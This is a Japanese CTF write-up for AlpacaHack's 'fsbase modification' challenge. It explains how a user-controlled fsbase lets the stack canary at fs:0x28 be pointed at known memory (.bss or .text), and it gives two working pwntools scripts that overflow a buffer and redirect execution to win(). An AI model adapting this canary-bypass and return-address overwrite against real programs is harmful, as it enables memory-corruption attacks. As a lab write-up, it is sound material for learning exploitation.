# ■ Writeup::fsbase-modification
[fsbase modification - AlpacaHack](https://alpacahack.com/daily/challenges/fsbase-modification)

# 1. Solution
fsbaseを自由に設定できるので, canary値を指す `fs:0x28` を既知の値にすればよい.

`fs:0x28` が `.bss` を指すようにすることで簡単に実装できる.

`vuln()` 内のstackは以下の様になっている.

```
↑ Lower
--------------------------
| buf: 8byte
--------------------------
| canary: 8byte
--------------------------
| saved rbp: 8byte
--------------------------
| ret: 8byte
--------------------------
↓ Higher
```

ので, これに沿って `payload` を構築する. canaryには `.bss` 領域を指すようにするので, `b'\x00' * 8` で上書きすればよい.

`solve.py`:
```python
from pwn import *

elf = ELF('./chal')

_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

win_addr = elf.symbols['win']
canary_addr = elf.get_section_by_name('.bss').header.sh_addr
fsbase = canary_addr - 0x28
print(f'[*] canary_addr: {hex(canary_addr)}')
print(f'[*] fsbase: {hex(fsbase)}')

io.sendlineafter(b': ', str(fsbase).encode())

payload = b'A' * 8 # buf[8]
payload += p64(0) # canary(8) = 0
payload += b'B' * 8 # saved_rbp(8)
payload += p64(elf.symbols['win']) # ret(8)
io.sendafter(b'> ', payload)

flag = io.recvregex(b'Alpaca{.+}')
print(f'[+] Flag: {flag.decode()}')

```

# 2. Explanation
## 2.0. `chal.c`
`chal.c`:
```C
...
14	void vuln(void) {
15	    char buf[8] = {0};
16	    write(STDOUT_FILENO, "Please leave a message> ", 24);
17	    read(STDIN_FILENO, buf, 32);
18	}
19	
20	int main(void) {
21	    write(STDOUT_FILENO, "fsbase(-1 for testing a default vuln behavior): ", 48);
22	    char buf[32] = {0};
23	    read(STDIN_FILENO, buf, sizeof(buf) - 1);
24	    unsigned long fsbase = strtoul(buf, NULL, 10);
25	
26	    int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
27	    if (result < 0) {
28	        write(STDOUT_FILENO, "arch_prctl failed.\n", 19);
29	    }
30	
31	    vuln();
32	}
```

## 2.1. fsbase
fsbaseはFSセグメントレジスタのベースアドレスを指す. メモリ上のTLS(Thread Local Storage)の開始位置を指す. 通常はTLS領域内のランダムな位置を指す.

今回は `vuln()` 実行前にfsbaseを自由に設定できるようになっているので, これを利用して後述するcanaryによるStack Smashing Protectorをbypassする.

```C
...
22	    char buf[32] = {0};
23	    read(STDIN_FILENO, buf, sizeof(buf) - 1);
24	    unsigned long fsbase = strtoul(buf, NULL, 10);
25	
26	    int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
...
```

## 2.2. canary
canary値は関数プロローグにて `fs:0x28` から読み込まれ, エピローグで検証される.

`vuln()` の逆アセンブルを見るとわかりやすい.:

```bash
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x0000000000401225 <+0>:     endbr64
   0x0000000000401229 <+4>:     push   rbp
   0x000000000040122a <+5>:     mov    rbp,rsp
   0x000000000040122d <+8>:     sub    rsp,0x10
   0x0000000000401231 <+12>:    mov    rax,QWORD PTR fs:0x28 <- load
...
   0x0000000000401278 <+83>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040127c <+87>:    sub    rax,QWORD PTR fs:0x28 <- verify
   0x0000000000401285 <+96>:    je     0x40128c <vuln+103>
   0x0000000000401287 <+98>:    call   0x401090 <__stack_chk_fail@plt>
   0x000000000040128c <+103>:   leave
   0x000000000040128d <+104>:   ret
```

前述の通り, fsbaseを自由に設定できるということは, canary値(`fs:0x28`)を自由に設定できることと同意なので, これを用いる.
## 2.3. `.bss` セクション
`.bss` 領域は実行時にゼロ初期化( `NOBITS` )され, メモリにロードされる( `A (Alloc)` フラグが立っている).

```bash
$ readelf -S ./chal | grep -A1 .bss
  [26] .bss              NOBITS           0000000000404038  00003038
       0000000000000008  0000000000000000  WA       0     0     1
```

canary値としてこの `.bss` セクションを指定することで簡単にStack Smashing Protectorをbypassできる.
# 3. 補足
canary値の設定先としてゼロ初期化されている `.bss` セクションを用いたが, 静的に既知かつメモリにロードされる領域ならば, どれを設定先としてもよい.: `.data`, `.rodata`, `.text`, `.interp`, `.note.ABI-tag`, `.note.gnu.build-id`, `.dynstr`, `.dynsym`, `.eh_frame`, `eh_frame_hdr`, `.init_array`, `.fini_array`, `.plt`, `.plt.sec`, etc.

## 3.1. `.text`セクションを用いてexploitしてみる

```bash
$ readelf -S ./chal | grep -A1 .text
  [15] .text             PROGBITS         00000000004010d0  000010d0
       000000000000029f  0000000000000000  AX       0     0     16

$ objdump -s -j .text ./chal | head -n10

./chal:     ファイル形式 elf64-x86-64

セクション .text の内容:
 4010d0 f30f1efa 31ed4989 d15e4889 e24883e4  ....1.I..^H..H..
 4010e0 f0505445 31c031c9 48c7c78e 124000ff  .PTE1.1.H....@..
 4010f0 15e32e00 00f4662e 0f1f8400 00000000  ......f.........
 401100 f30f1efa c3662e0f 1f840000 00000090  .....f..........
 401110 b8384040 00483d38 40400074 13b80000  .8@@.H=8@@.t....
 401120 00004885 c07409bf 38404000 ffe06690  ..H..t..8@@...f.
 
```

`0x4010d0 + 0x28 = 0x4010f8: 0f1f8400 00000000` (little-endianに注意)

`solve-text.py`
```python
from pwn import *

elf = ELF('./chal')

_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

sh_addr = elf.get_section_by_name('.text').header.sh_addr
print(f'[*] sh_addr: {hex(sh_addr)}')

io.sendlineafter(b': ', str(sh_addr).encode())

payload = b'A' * 8 # buf[8]
# canary_dummy = 0x00000000_00841f0f
canary_dummy = u64(elf.read(sh_addr + 0x28, 8))
print(p64(canary_dummy))
payload += p64(canary_dummy) # canary(8)
payload += b'B' * 8 # saved_rbp(8)
payload += p64(elf.symbols['win']) # ret(8)
print(f'[*] {len(payload) = }byte')
io.sendafter(b'> ', payload)

flag = io.recvregex(b'Alpaca{.+}')
print(f'[+] Flag: {flag.decode()}')
```
